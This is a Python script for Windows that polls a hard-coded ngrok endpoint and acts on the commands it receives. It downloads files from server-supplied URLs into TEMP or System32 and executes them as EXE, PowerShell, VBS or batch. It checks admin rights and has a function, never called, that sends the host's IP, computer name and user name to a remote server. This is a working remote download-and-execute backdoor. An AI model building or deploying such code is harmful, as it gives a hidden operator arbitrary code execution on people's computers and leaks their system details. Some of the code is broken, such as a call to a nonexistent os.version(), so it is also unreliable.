import os
import sys
import time
import requests
import subprocess
from datetime import datetime
from pathlib import Path
import ctypes

LOG_FILE_PATH = r'C:\MSPS\MSPS_log.txt'
TEMP_DIR = Path(os.getenv('TEMP', 'C:\\Temp'))
SYSTEM32_DIR = Path(r'C:\Windows\System32')
WEB_URL = 'https://robust-ocelot-moderately.ngrok-free.app/api/parameters'  # Replace with your URL

def ensure_log_directory_exists(log_file_path):
    log_dir = Path(log_file_path).parent
    if not log_dir.exists():
        try:
            log_dir.mkdir(parents=True, exist_ok=True)
            log_message(f"Log directory created: {log_dir}")
        except Exception as e:
            log_message(f"Failed to create log directory: {str(e)}")
            raise

def log_message(message):
    with open(LOG_FILE_PATH, 'a') as log_file:
        log_file.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - {message}\n")

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def download_file(url, path):
    response = requests.get(url, stream=True)
    if response.status_code == 200:
        with open(path, 'wb') as file:
            for chunk in response.iter_content(chunk_size=8192):
                file.write(chunk)
    else:
        raise Exception(f"Failed to download file. Status code: {response.status_code}")

def execute_file(path, file_type):
    try:
        if file_type == 'exe':
            result = subprocess.run([path], check=True, capture_output=True)
            log_message(f"Executed EXE: {path}, Output: {result.stdout.decode()}")
        elif file_type == 'ps1':
            result = subprocess.run(['powershell', path], check=True, capture_output=True)
            log_message(f"Executed PS1: {path}, Output: {result.stdout.decode()}")
        elif file_type == 'vbs':
            result = subprocess.run(['cscript', path], check=True, capture_output=True)
            log_message(f"Executed VBS: {path}, Output: {result.stdout.decode()}")
        elif file_type == 'bat':
            result = subprocess.run([path], check=True, capture_output=True)
            log_message(f"Executed BAT: {path}, Output: {result.stdout.decode()}")
        else:
            log_message(f"Unknown file type for execution: {file_type}")
    except Exception as e:
        log_message(f"Exception executing file {path}: {str(e)}")

def send_system_info(url):
    try:
        data = {
            'IPaddress': requests.get('https://api.ipify.org').text,
            'system_name': os.getenv('COMPUTERNAME', 'Unknown'),
            'logged_in_user': os.getenv('USERNAME', 'Unknown'),
            'os_name_version': f"{os.name} {os.version()}",
            'date_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        response = requests.post(url, data=data)
        if response.status_code == 200:
            log_message(f"System info sent successfully: {data}")
        else:
            log_message(f"Failed to send system info. Status code: {response.status_code}")
    except Exception as e:
        log_message(f"Exception sending system info: {str(e)}")

def main():
    # Ensure log directory exists
    ensure_log_directory_exists(LOG_FILE_PATH)
    
    log_message('Script started.')

    while True:
        try:
            response = requests.get(WEB_URL)
            if response.status_code == 200:
                params = response.json()
                if len(params) != 5:
                    log_message(f"Invalid response parameters: {params}")
                    continue
                
                command, path, filename, timetoexecute, gotosleep = params

                if command == '0':
                    admin_status = '1' if is_admin() else '0'
                    log_message(f"Admin status: {admin_status}")
                    continue

                file_path = (SYSTEM32_DIR if command in ['5', '6'] else TEMP_DIR) / filename
                if os.path.exists(file_path):
                    os.remove(file_path)

                download_file(path, file_path)
                log_message(f"Downloaded file: {file_path}")

                if timetoexecute:
                    time.sleep(float(timetoexecute))

                file_type = {
                    '1': 'exe',
                    '2': 'ps1',
                    '3': 'vbs',
                    '4': 'bat'
                }.get(command, 'unknown')

                execute_file(file_path, file_type)

                if command in ['5', '6']:
                    log_message(f"Script terminating after executing file: {file_path}")
                    break

                log_message(f"Command {command} executed successfully.")
            else:
                log_message(f"Failed to fetch data. Status code: {response.status_code}")

            time.sleep(300)  # Wait 5 minutes before making another request

        except Exception as e:
            log_message(f"Exception in main loop: {str(e)}")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        log_message(f"Unhandled exception: {str(e)}")
